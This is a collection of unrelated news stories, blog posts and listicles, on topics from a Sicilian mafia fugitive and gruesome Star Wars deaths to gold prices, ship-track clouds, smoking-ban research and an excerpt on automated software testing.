A mafia boss who got out of jail by faking paralysis and anorexia has been captured after more than two months on the run .
Police arrested Francesco Di Stefano as he dined at a village near the Sicilian city of Catania , which he had driven to in a sports car .
When asked why he was not in a wheelchair , he said : " It 's a miracle ! "
He had been allowed to serve a 30 - year drug sentence at his wife 's home in Bologna after hospital treatment for anorexia and post - traumatic paraplegia , but escaped house arrest .
Police said it was clear he had faked his condition , using " willpower " to get his weight to 84lb ( 38kg ) .

For all intents and purposes , the Star Wars Saga was always a movie meant for the younger audience .
Lucas himself has admitted , when bombarded with questions as to why his universe is populated by Muppets and infantile alien races , that the point was to get a reaction from the youth .
However , grown - ups frequent his films and have discovered some pretty adult and decidedly less youth - oriented topics .
Take for instance the incredibly pointless plot structures based solely on politics and trade routs that infest the far inferior second trilogy .
Yeah , kids love hearing about coups and government negotiations .
They live for that stuff !
Well , be that as it may , there are far more sinister story subjects afoot as well : Mass , unnecessary killings .
For what is , essentially , a Space Opera , to be festooned with so many needless deaths is not quite as mind boggling as you might assume .
Despite the fact that the core audience was supposed to be children , for which each and every bit of merchandise would later be geared .
Operas in general tend to stray toward sing - song deaths and long , drawn - out farewell scenes .
But even so , for those of us who are life - long Star Wars fans , be prepared for a bit of a shock as we explore The Top Ten Most Unnecessarily Gruesome Star Wars Deaths .
10 ) The Poor Tauntaun , a Furry Tent
Empire Strikes Back
In The Empire Strikes Back , the beast of burden of choice on the planet Hoth was the Tauntaun .
So , it came as no surprise that Han and Luke both needed one while scouting about for any signs of the Empire .
However , when the going got tough and the weather took a turn for the worse , the Tauntauns showed their true colors .
First , as Luke passes by a cave of the notorious Yeti - like snow monster , The Wampa , he gets knocked from his mount when a massive paw nearly decapitates the hapless hairy kangaroo , and drags his gored carcass , oh , and the Tauntaun ( rim shot ) to his lair to be later consumed .
Soon after , once Han has located a dazed and half - frozen Luke wandering around aimlessly , Han uses Luke ’s Lightsaber ( the first and only time , by the way ) and guts the collapsed Tauntaun carcass like a fish and jams Luke ’s useless ass inside .
Now tell me : do these scenes feel just a slight bit inappropriate for their intended audience ?
Well , maybe not my kids , but you know what I mean .
9 ) A Zantac Moment For General Grievous
Revenge of the Sith
No one will argue the fact that General Grievous was a sadistic madman of a warlord who stopped at nothing to get just what he wanted , up to and including his favorite souvenirs : Jedi Lightsabers .
There should have also been no discernible doubt that he was going to get whacked one way or another .
However , that being said , watching Obi Wan fire away at his exposed heart with a laser blaster was pretty damn violent .
Though the second trilogy did n’t have much to offer in the way of acting or brilliant performance skills , it is to no one ’s disbelief that Ewen McGreggor stole the show , at least within the realm of the Jedi actors ( especially over one Hayden Christiansen , but I wo n’t go into his wooden stiffness here …
I said ‘ wooden stiffness ’. ) , and this scene in particular iced the cake .
We all know how Obi Wan feels about blasters as a whole , so when he went trigger - happy on Grievous ’ asthmatic ass , it was almost too vindictive and mobbish up to the point when he dropped the still - smoking weapon and proclaimed it , ‘ uncivilized ’ .
Really ?
8 ) Kentucky Fried Aunt Beru & Uncle Owen
A New Hope
So , while Luke is off following around that wacky hermit , Old Ben Kenobi with droids in tow , Imperial Stormtroopers masquerading as Sand People obliterate and torch the Lars - Skywalker homestead destroying everything inside , including Luke ’s unsuspecting Aunt and Uncle .
When the revelation finally hits Luke like a ton of blue milk that the possibility of the Empire wanting what ’s hanging around in R2’s ‘ rusty innards ’ surely exists , he hauls ass home to make sure his family has n’t been engulfed in flames .
Whoops !
Oh , and in case the picture is n’t clear enough , the image shows the two charred corpses just hanging around right where children ( ie : mine ) can ask , ‘ What ’s that stuff , Dad ? ’
Nice one .
7 ) The Sad , Sad Death of a Teddy Bear
Return of the Jedi
When a big-ass wooded planet chock - full of cute , furry , miniature Wookies ( yep , it was originally intended to be inhabited by Chewie ’s kin ) decides to befriend the Rebel cause , one may want to rethink the course of action next chosen .
It ’s very much like enlisting the aid of an army of Teddy Ruxpins .
Well , as useful and helpful as they ultimately turned out to be ; they were far too cute , far from menacing , and initially did nothing more than worship the fey C - 3P0 and hump
Han ’s leg .
Soon , however , they were fully engaged in battle and stomping the far stupider Stormtroopers left and right .
That is , until one Ewok fell during a skirmish and died in his friend ’s fluffy arms .
Look , I ’m 35 and that chokes me up every time .
And yes , I understand countless more likely lost their plush - little lives , but we never saw it !
Imagine a five - year old looking at you with glistening puppy - dog eyes , lips a-quiver , asking why the bear is dead !
Damn you Lucas !
6 ) Strangling a Fat Slug Crime - Boss
Return of the Jedi
Warning :
This scene kills two birds with one stone !
It ’s simultaneously gruesome as hell and incredibly sexy all at once !
Watch at your own risk !
Seriously !
Metal - bikini wearing Leia chained to the giant , sluggish crime - boss , Jabba the Hutt made a little something stir back in 1986 when I first saw The Return of the Jedi at my local Plaza 2 .
Let ’s face it : Leia was smoking hot and did nothing more than sit idly by , biding her time , writhing for the pleasure of her monstrous captor while Han suffered in the jail cell and Luke fended off the massive Rancor .
Then , with a lithe flip and a bit of good timing , she angled herself behind the vile creature and strangled the shit out of him with his own leash .
Now that , sir , is something straight out of The Godfather … only with better aliens .
Man , to have been a fly on the wall …
5 ) Jek Porkins Makes For a Fine Barbecue
A New Hope
They knew it was a suicide mission .
Each and every X - Wing pilot was aware of the risks , yet chose to fly on as they cruised into the Death Star trench .
Each had his position , and only a select few were to even get in close enough to launch the photon torpedoes into the exhaust port .
And yet there were those brave few who were , for all intents and purposes , attention - grabbing targets .
One in particular , the eponymous and erstwhile Jek Porkins was there for the soul purpose of getting his flaming ass handed to him .
He did n’t disappoint .
As pilot after pilot succumbed to the turbo lasers mounted within the trench , everyone gave a silent salute to Porkins as he was vaporized into a roasted , and mouth - watering , ball of bacon - scented fire .
May The Forks Be With You !
4 ) Count Dooku Gets A Little Off the Top
Revenge of the Sith
I think everyone kind of knew from the onset that Anakin was a colossal asshole .
Oh sure , everyone knew of his ultimate rise to the helmeted Lord of the Sith , but even beyond that , as the young slave boy from Tatooine , Little Annie was still just a damn jerk .
So once he ’d grown a little and got a taste for what being a rule - breaking Jedi felt like , it was only a matter of time before he was doing Palpatine ’s bidding and killing for the sheer pleasure of it .
Case in point : Dooku has just entered the room and prepares to do battle , yet again , with Anakin and Obi Wan .
Obi Wan , ever the useful floor scrubber , gets his ass handed to him and falls .
Anakin , far angrier and broody , whips the snot out of the Sith Lord and fells him .
At this point it would have seemed just as logical to call it a day and cuff the old fart , but nooooo …
At the request of of the sinister Palpatine , Anakin lops of Dooku ’s head .
I , for one , did n’t see that coming .
A bit over the top … no pun intended .
3 ) Greedo : Useful Target Practice
A New Hope
Whether you believe Han shot first ( he did ) or Greedo ( he did n’t ) , the brutal exchange and subsequent execution in the darkened Mos Eisley Cantina did n’t end well for the green alien .
In the original trilogy during A New Hope , we witness one Space Pirate , Han Solo , arguing with one of Jabba ’s lackeys , Greedo .
They prattle on about how Han still owes the boss money , Han retorts with his insistence that he ’ll get it to him , and Greedo finally seals his own demise by pissing Solo off .
Han , ever the smart ass , slices Greedo ’s yes - man speech with his rapier wit , and guns him down with one blast .
Now , as the trilogy went though a series of otherwise harmless repairs , Lucas took it upon himself to decide that it would look better if Greedo fired his gun first .
This , however , completely turns on its head the whole idea - past and all - of Han Solo effectively turning him into something far less than his original intentions , ie : a grinning pussy .
However , this aside , the cold bloodedness to Han ’s killing was fully sealed by the searing plume of smoke rising from Greedo ’s dying corpse .
Gruesome .
2 ) Darth Vader : Galactic Serial Killer
Original Trilogy
When Vader ’s around , there was really no reason for anyone to be carrying a gun .
Mouth off , speak ill of the Force , suggest a different strategy … hell , order his sub with pickles :
That ’s a chokin ’ .
Sure , Vader had a Lightsaber , we all know that , but he only used it while battling other Jedi .
If he needed to put some underling bastard in his place , he ’d simply strangle the shit out of him and leave his lifeless carcass strewn across the floor .
Hell , as the image illustrates , he could crush your windpipe from miles away !
Evidently the Force transcends time and space and can ‘ F ’ you up from a view screen !
Man , now that is brutal and a fair bit unnecessary … however completely kick ass .
1 ) Obi Wan to Anakin : ‘ Die in a Fire ! ’
Revenge of the Sith
Though slightly misguided and a bit ho-hum , the fall of Anakin as a Jedi at the hands of his once father - figure and mentor , Obi Wan , was still pretty damn gruesome .
After the epic battle across the lava pits of Mustafar , Obi Wan gains the high ground and announces so to the persistent Anakin .
Stupidly , Anakin leaps to the Terra Firma only to come face to face with the whipping blade of Obi Wan ’s Lightsaber as it lops off his legs .
Beyond that , it was all up to the fires burning mere feet from Anakin ’s fallen form as flames singe him almost beyond recognition .
The final words achingly spat at Obi Wan were , ‘ I hate you ! ’ and never before have they stung so much .
I have to hand it to Christiansen ; his lack of acting ability culminated with a pretty damn convincing denouement … but only just barely .
Oh , and to say , ‘ but he did n’t die ! ’ is a bit slight , since it ’s exactly what did happen be it figuratively or otherwise : dead ’s dead .
This scene was the very reason Revenge of the Sith garnered a PG - 13 : rather disturbing to say the least .
I regret not having a simultaneous osx build , but time constraints did not allow for such indulgences ...

Egyptian Police Arrest Christian Father for Attempting to Free Kidnapped Daughter
Alexandria , Egypt ( AINA ) --
At dawn on Saturday , October 3 , 2009 , Egyptian State Security forces arrested a group of Christian Copts in different parts of the city in Alexandria , after severely assaulting them in front of their neighbors .
Their wives were also arrested , but because of intense objection protests by neighbors at the way they were handled and of the screams of their terrified children , they were released .
The men who were arrested are relatives of Rafaat Girges Habib , a man who helped a Coptic father free his kidnapped daughter from her Muslim husband 's home .
The arrests continued until Habib turned himself in to the police .
Egypt4Christ , based in Alexandria , reported that what started this incident was a telephone call on September 30 from Myrna , the only daughter of Coptic accountant Gamal Labib Hanna , in which she begged him to come and save her from her Muslim husband , Mohamad Hefnawy .
Myrna was abducted 10 months ago , forced to convert to Islam and married by a ' customary marriage contract ' by Osama Hefnawy to his son Mohammad .
Being 19 years old at the time , Myrna was under - age for a girl to be married .
According to Islamic Sharia a woman cannot get married before she reaches the age of 21 years ; she can only get married before through a mandate from her father or uncles alone .
Those requirements can be waived for the benefit of a non-relative only through a court ruling , which was not obtained in Myrna 's case .
On their way to free his daughter , the father , together with his brother and brother - in - law , passed by a cafe near St. George 's Church , Sidi Bishr , where Rafaat Girges Habib , a plumber who has done jobs in the father 's home , volunteered to accompany them to bring Myrna back .
As they went to the apartment where Myrna was held , they were met by Osama Hefnawy , father of Mohamed and five other Muslims , who threatened them .
A struggle ensued , and Myrna left with her father .
She was taken away to an establishment dealing with abduction cases like hers , especially that it was found out that she was six months pregnant .
Osama Hefnawy immediately filed a report with the police and the State Security Headquarters in Al - Farana , Alexndri downtown .
Myrna 's paternal uncles were arrested and charged with abduction , together with her father .
Myrna 's family apartment was broken into and the shop of Rafaat Girges Habib was completely demolished by the police .
Myrna 's father was forced to go to the police station to negotiate the release of his relatives and " for matters to be resolved amicably " as he was told by Lieutenant Ahmed Mekki , of the Police Department of Investigation , who contacted him on his cell phone .
Myrna 's uncles were forced to go and bring her back to the police station , where she was handed over to Osama Hefnawy .
In addition the police took the necessary commitments from her relatives not to harass him .
Coptic father Labib was released Friday morning .
Lawyers reported to Egypt4 Christ that the arrested Copts were tortured and their clothes were smeared with blood , especially Romany , brother of Rafaat Girges Habib .

TiVo , everyone ’s favorite DVR maker , has just signed an agreement with Google to hand over tons of data on its users habits for analysis .
The upshot : Advertisements are going to be even more targeted and personal .
It ’s how Internet TV ads will work in the future .
What TiVo gets is raw revenue , courtesy of Google ’s TV Ads service .
In exchange , Google gets accurate second - by - second data on which TiVo users of which types are watching which content at which times .
That ’s going to be absolutely invaluable to Google , since it constitutes an incredibly rich data pile to help understand what shows people are viewing .
And if you ’re worried about privacy , you need n’t –Google ’s only getting anonymized information .
The real trick inside this deal , of course , is that Google will most certainly not be concentrating on which shows TiVo users are watching .
Instead it ’ll be examining in great detail which ads people are watching , and how long they watch them before skipping through or changing the channel .
This information can let advertisers design more personalized adverts and ones that keep user attention for longer .
It will also help them to place ad breaks in a more targeted manner .
Once Google works out precisely how much attention users pay to which commercials , they can determine pricing structures in a far more accurate way than Nielsen ’s ratings , which concentrate mainly on which shows people are viewing .
Like it or not , this is a demonstration of how TV advertising will work in the future , when online streamed TV begins to snap up significant market share from the networks and cable .
The data much being handed to Google by TiVo will enable advertisers to adjust which adverts are included almost on the fly–bringing the benefits of reaching their target audience far more precisely than ever before .
As a viewer you ’ll benefit from ads that are more likely to be of interest to you –if you ’re a glass - half - full optimist anyway .
If you ’re already concerned about ads permeating your life , then this is probably not good news .

TOKYO ( MarketWatch ) --
Growing speculation over the potential end to dollar - based trading in the oil market may be part of the reason gold prices have rallied beyond $ 1,020 an ounce to stand near their highest level in 18 months .
And the strength was kept even as several top officials , including Saudi central bank chief Muhammad al - Jasser , denied the report .
Gulf Arab states , along with China , Russia , Japan and France , are planning to put an end to dollar - based trading in the oil market , according to an exclusive report published Tuesday in the U.K. by The Independent .
" News on gold 's expected future role in oil transactions between these trading partners has sent the price past $ 1,020 , " said Peter Spina , chief investment analyst at GoldSeek.com .
“ ' News on gold 's expected future role in oil transactions between these trading partners has sent the price past $ 1,020 . ' ” — Peter Spina , GoldSeek.com
In place of the greenback , the nations plan to use a basket of currencies , including the Japanese yen and Chinese yuan , the euro , gold and a new , unified currency planned for nations in the Gulf Co-operation Council , including Saudi Arabia , Abu Dhabi , Kuwait and Qatar , the report said .
The Independent said the plans were confirmed by both Gulf Arab and Chinese banking sources in Hong Kong .
Several top
Gulf central bankers immediately dismissed the talk , and the vice chairman of China 's central bank made no mention of such a move in a speech .
The report is " absolutely bullish , " for gold , said Peter Grandich , a metals writer at Agoracom .
" I 've not see gold 's fundamentals this bullish in years . "
The December contract for gold , the most - active on the Comex division of the New York Mercantile Exchange , closed Monday with a gain of $ 13.50 , or 1.3 % , at $ 1,017.80 an ounce .
By the morning in London , December gold was up $ 2.80 to $ 1,020.70 .
In mid-September , futures prices had climbed past $ 1,025 to hit a fresh 18 - month high .
The record intraday price for a front - month gold contract is $ 1,033.90 , set on March 17 , 2008 .
Many analysts had attributed the gains Monday to higher demand in the face of more weakness in the U.S. dollar .
See Metals Stocks .
But , as Spina pointed out , trading gold and other currencies in exchange for oil would " establish gold as a recognized medium of exchange , returning it a step closer to its role as money on a world trade system . "
So the price of gold " should continue to find upward price pressures on this news , " he said .
At the same time , " the domination of the U.S. dollar is further removed and really , it has been the pricing of oil in dollars for trade that has given it a huge boost in its demand globally , " said Spina .
If the dollar is presently being used to transact oil between these nations , then they must use many billions of dollars to do so , he explained .
" If they will switch away from the U.S. buck , then all that demand disappears , the need for the U.S. dollar diminishes , and its value should reflect this , " he said .
At last check , one U.S. dollar bought 88.97 Japanese yen , down from 89.49 yen in late New York Trading Monday .
One euro bought $ 1.4726 , up from $ 1.466 .
" Transacting in gold will boost demand [ for gold ] as the U.S. dollar 's role diminishes , " said Spina .
All in all , " this news is certainly bullish for gold 's prospects for further use in international trade going forward , " he said .
Tour de France champion Alberto Contador says the performance of Bradley Wiggins this year was no surprise , predicts Mark Cavendish will win a Tour green jersey in future and says he hopes to race in the London 2012 Olympic time trial .
But he tells BBC Sport 's Matt Slater he does not think he can repeat the all - around dominance of the " incredible " Eddy Merckx in the modern era .

A bank of clouds off North America ’s west coast featured a series of white trails in early October 2009 .
The Moderate Resolution Imaging Spectroradiometer ( MODIS ) on NASA ’s Terra satellite captured this true - color image on October 5 , 2009 .
Although the white trails look vaguely like contrails left behind by airplanes , they actually result from ship exhaust .
The exhaust trails ’ appearance — whiter than those of the surrounding clouds — results from them having smaller , but more numerous cloud droplets .
Compared to the surrounding air , ship exhaust contains more particles , and each particle can act as a nucleus around which water vapor condenses .
Because the available water is divided up among a greater number of particles , the resulting ship tracks consist of cloud particles that are smaller and more abundant than those of the surrounding clouds .
The cloud bank shows a fairly sharp boundary along its eastern edge , and the ship tracks end with the other clouds .
The cloud - free area to the east apparently holds drier air , which lacks sufficient moisture to lead to cloud formation .

Six years ago , when I asked an epidemiologist about a report that a smoking ban in Helena , Montana , had cut heart attacks by 40 percent within six months , he thought the idea was so ridiculous that no one would take it seriously .
He was wrong .
Since then 10 other studies have attributed substantial short - term reductions in heart attacks to smoking bans , and last week an Institute of Medicine ( IOM ) committee endorsed their findings .
But a closer look at the IOM report , which was commissioned by the U.S. Centers for Disease Control and Prevention , suggests its conclusions are based on a desire to promote smoking bans rather than a dispassionate examination of the evidence .
Thousands of jurisdictions around the world restrict smoking .
Some of them are bound to see significant drops in heart attacks purely by chance , while others will see no real change or significant increases .
Focusing on the first group proves nothing unless it is noticeably bigger than the other two groups .
The largest study of this issue , which used nationwide data instead of looking at cherry - picked communities , concluded that smoking bans in the U.S. " are not associated with statistically significant short - term declines in mortality or hospital admissions for myocardial infarction . "
It also found that " large short - term increases in myocardial infarction incidence following a workplace ban are as common as the large decreases reported in the published literature . "
That study , published by the National Bureau of Economic Research ( NBER ) in March , suggests that publication bias — the tendency to report positive findings and ignore negative ones — explains the " consistent " results highlighted by the IOM committee .
But even though the panelists say they tried to compensate for publication bias by looking for relevant data that did not appear in medical journals , they ignored the NBER paper , along with analyses that found no declines in heart attacks following smoking bans in California , Florida , New York , Oregon , England , Wales , Scotland , and Denmark .
If smoking bans reduce heart attacks , the effect could be due to declines in smoking , declines in secondhand smoke exposure , or both .
The IOM report settles on that last explanation , quite a leap given that " only two of the studies distinguished between reductions in heart attacks suffered by smokers versus nonsmokers . "
In any case , when people stop smoking , their heart attack risk declines gradually over several years , and it's hard to see why the risk would fall any faster for people exposed to secondhand smoke .
Furthermore , estimates from the CDC and the American Heart Association indicate that smoking and secondhand smoke together account for about 25 percent of heart disease deaths .
So how could a smoking ban , even one that eliminated all smoking , cut heart attacks by 40 percent ( or 47 percent , as another study claimed ) ?
The IOM panelists dodge these issues by declining to estimate the size or the timing of the impact from smoking bans , citing the limitations of the studies and the wide variations between them .
But " if you can't even estimate the magnitude of an effect , " notes Michael Siegel , a Boston University public health professor who was one of the report 's reviewers , " you are hardly in a position to conclude that [ it ] exceeds random variation combined with the known secular decline in heart attack rates . "
Even while taking refuge in imprecision , the IOM committee tries to make transparently absurd claims seem plausible by intimating that spending a half - hour in a smoky bar just might kill you , even if you were completely healthy when you went in .
If so , where are the bodies ?
The report concedes " there is no direct evidence that a relatively brief exposure to secondhand smoke can precipitate an acute coronary event . "
Siegel , who faults the IOM committee 's " sensationalistic " approach , is a longtime supporter of smoking bans who nevertheless tries to separate his political advocacy from his scientific analysis .
It 's too bad the authors of the IOM report , who immediately used it as an excuse to demand strict smoking regulations throughout the country , did not follow his example .

Electric Literature : Meet the New Boss , Same as the Old Boss
Contrary to popular belief , the normal execution of the law of primogeniture is not a given !
It is not merely enough to be born the first son of a king or queen to ascend to the throne and ensure a continuity between one regime and the next .
You have to first learn the ways and means of royalty .
You must first make sure that you are the kind of king that the court already expects you to be .
Otherwise , it does not matter how blue your blood is .
You are disinherited , outside the body politic .
You must start from scratch , deal with the people directly .
This is a frightening option , to some .*** The first I heard about Electric Literature was from a friend of mine who saw their recent live performance , as filmed by L Magazine .
He said : " These guys do what you guys do , only it 's not as interesting , and there were a thousand people there .
" I can think of three immediate objections : (1) Do these guys do what we do ?
( 2) Is it not as interesting ?
(3) Were 1,000 people there ?
Tackling none of these directly , I think a point can be made about how organizations , enterprises , and societies rise and fall on the bones of existing organizations .
Here is a short story .
A man walks into an office .
" Give me $ 10,000 , so I may start a magazine , " he crows .
The occupant of the office , stirs .
He is a young man wearing a rose - colored blazer with gigantic shoulder pads and cardboard 3 - D glasses .
His hair is chartreuse , towering , like Jack Nance 's when he was young , so young and beautiful .
"
Why should I , " he asks , with a smile , not wanting to seem un -hip .
" Because I want to reinvent the short story and electronic publishing , " says the young man , on a mission .
" I ask for $ 10,000 .
I ask for nothing for myself . "
" I 'd like to help you , " says Jack Nance .
" But I 'm going to need a better reason .
" The young man thinks .
He bites his lip .
His forehead becomes cornrows .
Viral marketing , " he asserts .
Jack Nance begins to quiver , jelly - like , he quivers .
" No no oh god , I mean , not viral marketing .
I mean no .
I mean Ã¢Â  Â " " And he stops .
And he thinks .
And he smiles .
" I can give you Ã¢ÂÂ " Michael Cunningham , " he says .
" He made the Hours .
I mean , the story that became the Hours .
" Jack Nance looks up .

Electric Literature pays its writers $ 1000 a story .
Awesome — except that if you 're borrowing that kind of money , you must have a plan to pay back the people from whom you borrow it .
You must succeed at selling your stories to enough people to make back that money .
Otherwise , you are doomed .
As best as I can tell , their plan is to convince investors that their money is safe because ( 1 ) they 're using cost - effective print - on - demand technology ( I do n't even want to get into how fucked up that is ) , and ( 2 ) they 're publishing " name " writers , ones who are guaranteed to get attention — and who , from the looks of things , did get attention .
Thus the 1,000 people at their big inaugural you - are - ripping - off - the - Fiction - Circus - apparently - but - that 's - cool - we - like - what - we - do - and - more - people - should - do - it - really event .
So they get investment money to publish a dangerous literary magazine , to make people read short stories again .
In exchange for that money , they publish new work by Michael Cunningham .
I agree that it 's cool that they 're also publishing T Cooper .
But look : they 're publishing Michael Cunningham as an example of dangerous literary fiction .
Which is more likely : that fiction is " dying " because people have not seen enough sassy advertising telling them that " fiction is DANGEROUS " ?
Or that fiction is " dying " because it 's all written in this high - academic , " lush " , ready - for - my - closeup I want to be a writer so bad I can't even tell you style ?
Because there is no danger in it , and readers can sense that , and they stay away because as far as bland entertainments go , there are more efficient options on the table ?
Which is more likely :
That EL has accepted money from investors on the strength of their belief that Michael Cunningham represents dangerous literary fiction ?
Or that they have accepted money from investors on the strength of their belief that by presenting themselves as dangerous , hip , e-media pioneers who will save the short story and literary fiction from dusty oblivion , they can successfully build up enough hype and buzz to create a self - sustaining magazine that can throw up an occasional Youtube animation / illustration while actually publishing the same authors , the same stories , and the same bland - ass crap that everyone else is publishing ?
Say what you will about n+1 , and we have , but at least they were using their mad bank to finance something alternative , drab , political , dour , and grim .
Their issue # 7 , which I was kindly sent a free copy of by Keith Gessen in exchange for talking shit about him , features a very good story by Caleb Crain , who I 've never heard of , plus weirdo expatriate Russian poetry and a tiresome Italo Calvino ripoff by " Last Samurai " Helen DeWitt .
This is at least eclectic and daring .
They at least have something specific they are doing .
This is not what Electric Literature is doing .
Electric Literature , based on their first issue , is people using their mad bank to convince us , once again , to ride the Ecthroi wind to hype and disaster .
They are entering into investor relationships , which means they now have investor obligations to provide salable literary product .
This is going to be a problem when it comes to questions of ( 1 ) publishing fiction people might want to read , and ( 2 ) publishing fiction that actually represents some kind of new voice in the world , that breaks new ground , that is not a " beautiful " or " well - crafted " story .
Because that 's what 's going to move copies and activate readers who love their New Yorker .
That 's not what 's going to activate readers who have no hope and do not know that stories can make them have a better day .
The best we can hope for is that after six or seven issues Electric Literature pulls a fantastical bait - and - switch , ditches Cunningham and crew , and starts publishing John Fowora and Kerry Donoghue for $ 1,000 a pop once they have a guaranteed audience who they 're now willing to risk alienating , offending , and affecting .
The best we can hope for is that the new boss will not be the same as the old boss , despite using his methods , despite exhibiting his sense of literary taste , despite his cool advertising photos of models with cigars telling you that literature is BAD for you .
Did anyone ever immolate themselves because of the work of Michael Cunningham ?
Even toy with the idea ?
Electric Literature , I want to believe that this is Phase One of your master plan , that you are building a mighty machine using the master 's tools , and that when you are done you will use that machine to bulldoze the master 's house .
I want to believe that you are going to find the most fucked up , heartbreaking stories you can imagine , ones that represent voices other than Michael fucking Cunningham's , and that you are going to give the writers of each of those stories $ 1,000 , counting on the sheer novelty , imagination , and voice of those stories to bring your Cunningham - suckled readers back issue after issue .
But what I think is this : you are plugging an umbilical cord of fat and poison into your own navel .
And you will watch the poison flowing into you while you build your dangerous new e-magazine , and when you are finished , you will want to disconnect it .
But you will see the clean floor of the master 's house below your feet .
How ugly it would be , covered in fat and bile and poison .
You will see the clean floor .
You will hesitate .
Ah , the Good Guy .
In movies , he / she is usually played as clean - cut and wholesome .
But when the truly enterprising writer goes above and beyond the call of duty , sometimes character flaws combine to make a Good Guy go bad .
And sometimes they 're just total assholes .
He 's the kind of guy or girl you really want to like ... until that annoying little voice in your head says , " But wait a second ... did n't he just ...? "
Yeah .
They went there .
What a fistful of dicks !

A Jedi Master with a heart of gold , Qui - Gon saw the good in everyone and lived fastiduously by the Jedi code .
Remember , he trained the ever - awesome Obi Wan Kenobi and died a hero 's death fighting with the Force on his side .
But when you really stop and think about it ... Qui-Gon brought that foppish little bastard Anakin into the Jedi fold , despite the stern and almost terrifying warnings of all those around him .
He completely misinterpreted the prophecy about Anakin bringing balance to the Force , which nobody noticed until the end of the last movie .
Great work , genius .
Qui-Gon tried his hand at dueling with the friggin awesome Darth Maul , which ended in his tragic , yet completely senseless death ' Jedi are n't supposed to get all hypnotized by twirling lightsabers , are they ?
And for the coup de grace , he brought the eternally annoying Jar Jar Binks into the global consciousness .
May he roast forever in the Jedi version of Hell .
Successful attorney and happily married family man Dan seemed to have it all : a loving wife , a cute little girl and a bunny rabbit .
A lapse of judgment leads him to what he thought was a short - lived fling with a foxy editor , and hilarity ensues .
You really want to think that he was the victim here , and in some ways he was heroic because his poorly planned exploits terrified millions of men into keeping their pants on .
Dan conveniently waited until his wife was out of town , and then let his dick do his thinking for him .
He screwed around on his wife ( not cool ) , and then gave ape - shit crazy hosebeast Glenn Close the cold shoulder ( not smart ) .
To top it all off , he forgot to thank his lucky stars that he was n't married to Lorena Bobbitt , because a bunny would n't have been the only thing they would have found in that boiling pot .
Sure , he was one of the co-founders of the last white boy gang in Manhattan , but Tony tried to make something of himself .
He broke away from the thug life and went to work as a shop boy , only to find himself pulled back in when his best pal wants to take the streets of New York from the Puerto Ricans .
He defied all social conventions by falling in love with a spicy Latina , and then died a heroic death fighting for the love of his young life .
Romantic , right ?
Sure , until you consider ' Tony was a white bread wannabe gangsta who sang and danced like , well , like a white bread wannabe gangsta .
He messed around with Bernardo 's sister , then stabbed him to death , and then had the nerve to act all surprised when Bernardo 's homeboy Chino popped a cap in his ass .
Clearly , the thug life taught him nothing .
Let 's just hope the Afterlife is not such a raging failure .
Nice family guy and general everyman Roy Neary had a decent job , a pretty wife and several precocious children .
When his life was turned upside down after seeing UFOs , he tried hard to keep it all together as an obsession with the Devil 's Tower consumed him .
Still ' Dude went bat - shit .
Played with his food .
Stole Mrs. Harris ' chicken wire and let all her ducks run away just so he could build a half - scale model of a national monument in his living room .
Neary carried on a quasi-emotional affair with the Mom from A Christmas Story and became an " Ugly American " in front of the amazing Francois Truffaut when he demanded to speak only to an American .
Finally , Roy dumped his wife and kids for aliens , revealing a spectacular level of selfishness heretofore never before witnessed on Earth .
What an intergalactic jerk - off .
Morpheus was the Obi-Wan of the Matrix universe : wise beyond his years but still able to kick out the jams and lay a smack or two down when absolutely necessary .
For an old dude in spectacles , he was pretty sweet at the old bullet - time ass - kicking too .
Plus , he managed to make Keanu Reeves look good .
Which is no mean feat .
Just like Qui -Gon Jinn , poor Morpheus suffers from Misguided Prophecy Syndrome when Neo turns out ( briefly ) not to be The One .
He was so upset , he spent the final Matrix movie sulking in a sweater and playing co-pilot to Will Smith 's wife .
And once you realise his brand of cod-philosophy is ripped off from The Sphinx in Mystery Men , you can't take him seriously ( " To learn my teachings , I must first teach you how to learn . " )
Still , at least we know he likes sweaty underground raves and trance music .
Hope you choke on your whistle , doofus .

Implementing Automated Software Testing - Continuously Track Progress and Adjust Accordingly
Thom Garrett , Innovative Defense Technologies , www.IDTus.com
This is an excerpt from the book " Implementing Automated Software Testing , " by Elfriede Dustin , Thom Garrett , Bernie Gauf , Copyright Addison Wesley , 2009
" When you can measure what you are speaking about , and can express it in numbers , you know something about it ; but when you cannot measure it , when you cannot express it in numbers , your knowledge is of a meager and unsatisfactory kind . "
- Lord Kelvin
Most of us have worked on at least one project where the best - laid plans went awry and at times there was n't just one reason we could point to that caused the failure .
People , schedules , processes , and budgets can all contribute . [ 1 ]
Based on such experiences from the past , we have learned that as part of a successful automated testing ( AST ) program it is important that the right people with the applicable skills are hired , goals and strategies be defined and then implemented , and that steps be put in place to continuously track , measure , and adjust , as needed , against these goals and strategies .
Here we 'll discuss the importance of tracking the AST program , to include various defect prevention techniques , such as peer reviews and other interchanges .
We 'll then focus on the types of AST metrics to gather so that we can measure progress , gauge the effectiveness of our AST efforts , and help keep them keep on track and / or make adjustments , if necessary .
Finally , we will discuss the importance of a root / cause analysis if a defect or issue is encountered .
Based on the outcome of these various efforts , adjustments can be made where necessary ; e.g. , the defects remaining to be fixed in a testing cycle can be assessed , schedules can be adjusted , and / or goals can be reduced .
For example , if a feature is left with too many high - priority defects , a decision can be made to move the ship date , to ship the system as is ( which generally is n't wise , unless a quick patch process is in place ) , or to go live without that specific feature , if that is feasible .
Success is measured based on achieving the goals we set out to accomplish relative to the expectations of our stakeholders and customers .
AST Program Tracking and Defect Prevention
In our book " Implementing Automated Software Testing ( IAST ) " in we cover the importance of valid requirements and their assessment ; in another we discuss the precautions to take when deciding what to automate ; and yet another section we discussed in detail the importance of peer reviews .
Here we 'll provide additional ideas that aid in defect prevention efforts , including technical interchanges and walk - throughs ; internal inspections ; examination of constraints and associated risks ; risk mitigation strategies ; safeguarding AST processes and environments via configuration management ; and defining and tracking schedules , costs , action items , and issues / defects .
Conduct Technical Interchanges and Walk - throughs
Peer reviews , technical interchanges , and walk - throughs with the customer and the internal AST team represent evaluation techniques that should take place throughout the AST effort .
These techniques can be applied to all AST deliverables - test requirements , test cases , AST design and code , and other software work products , such as test procedures and automated test scripts .
They consist of a detailed artifact examination by a person or a group other than the author .
These interchanges and walk - throughs are intended to detect defects , non-adherence to AST guidelines , test procedure issues , and other problems .
An example of a technical interchange meeting is an overview of test requirement documentation .
When AST test requirements are defined in terms that are testable and correct , errors are prevented from entering the AST development pipeline that could eventually be reflected as defects in the deliverable .
AST design component walk - throughs can be performed to ensure that the design is consistent with defined requirements - e.g. , that it conforms to OA standards and applicable design methodology - and that errors are minimized .
Technical reviews and inspections have proven to be the most effective forms of preventing miscommunication , allowing for defect detection and removal .
Conduct Internal Inspections
